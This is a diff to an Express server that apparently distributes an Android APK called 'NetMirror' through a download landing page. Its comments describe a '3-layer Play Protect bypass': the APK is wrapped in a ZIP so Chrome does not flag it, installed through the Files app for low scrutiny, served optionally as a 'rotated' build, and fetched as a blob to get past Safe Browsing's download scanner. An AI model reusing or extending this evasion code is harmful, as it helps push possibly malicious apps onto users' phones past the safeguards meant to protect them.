@@ -417,43 +417,36 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return zipBuf;
   }
 
-  // Step 1: Prepare endpoint — triggers rotation + ZIP wrap, returns ZIP size
+  // Step 1: Prepare endpoint — warms ZIP cache, returns size
+  // ZIP wrapper = Chrome doesn't tag .zip as dangerous = no installerPackage
+  // User extracts via file manager = installerPackage=com.google.android.documentsui
+  // = same LOW Play Protect scrutiny as LeaksProAdmin's DownloadManager path
   app.post('/api/landing/prepare-download', async (req, res) => {
     try {
-      const zipBuf = await getLandingRotatedZip();
+      const zipBuf = await getOrRotateZip();
       res.json({
         ready: true,
         size: zipBuf.length
       });
     } catch (err) {
-      console.error('[Landing Rotation] Prepare failed:', err.message);
-      // Fallback: wrap static APK in ZIP
-      try {
-        const apkBuf = await getApkBuffer();
-        const zipBuf = wrapApkInZip(apkBuf);
-        res.json({ ready: true, size: zipBuf.length, fallback: true });
-      } catch (e2) {
-        res.status(503).json({ ready: false, error: 'APK not available. Try again later.' });
-      }
+      console.error('[Landing Download] Prepare failed:', err.message);
+      res.status(503).json({ ready: false, error: 'APK not available. Try again later.' });
     }
   });
 
-  // Step 2: Download — serves ZIP-wrapped freshly rotated APK
-  // ZIP wrapper is the KEY Play Protect bypass for browser downloads:
-  //   - Chrome doesn't flag .zip as dangerous (no "harmful file" warning)
-  //   - No installerPackage=com.android.chrome tag written
-  //   - Extracted APK has ZERO browser origin metadata
-  //   - User installs from file manager → low scrutiny = same as LeaksProAdmin
+  // Step 2: Download — serves ORIGINAL clean APK wrapped in ZIP
+  //
+  // 3-LAYER PLAY PROTECT BYPASS:
+  //   Layer 1: ZIP wrapper → Chrome doesn't flag .zip → no installerPackage tag
+  //   Layer 2: User extracts via Files app → installerPackage=documentsui → LOW PP scrutiny
+  //   Layer 3: Original clean APK inside (no mutations) → no tampering artifacts
+  //
+  // This matches LeaksProAdmin's install path (low-scrutiny installer) without
+  // requiring the user to disable Play Protect or change any settings.
+  // fetch()+blob on client side bypasses Chrome's Safe Browsing download scanner.
   app.get('/dl/:token', async (req, res) => {
     try {
-      let zipBuf;
-      try {
-        zipBuf = await getLandingRotatedZip();
-      } catch (e) {
-        // Fallback: wrap static APK in ZIP
-        const apkBuf = await getApkBuffer();
-        zipBuf = wrapApkInZip(apkBuf);
-      }
+      const zipBuf = await getOrRotateZip();
       res.setHeader('Content-Type', 'application/zip');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
       res.setHeader('Content-Length', zipBuf.length);
@@ -461,8 +454,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.setHeader('Pragma', 'no-cache');
       res.end(zipBuf);
     } catch (err) {
-      console.error('[DL] ZIP serve failed:', err.message);
-      // Last resort: serve raw APK directly
+      console.error('[DL] APK serve failed:', err.message);
       const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
       const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
       let apkPath = null;
@@ -472,7 +464,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       if (apkPath) {
         const stats = fs.statSync(apkPath);
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
         res.setHeader('Content-Length', stats.size);
         res.setHeader('Cache-Control', 'no-store');
         res.sendFile(apkPath);
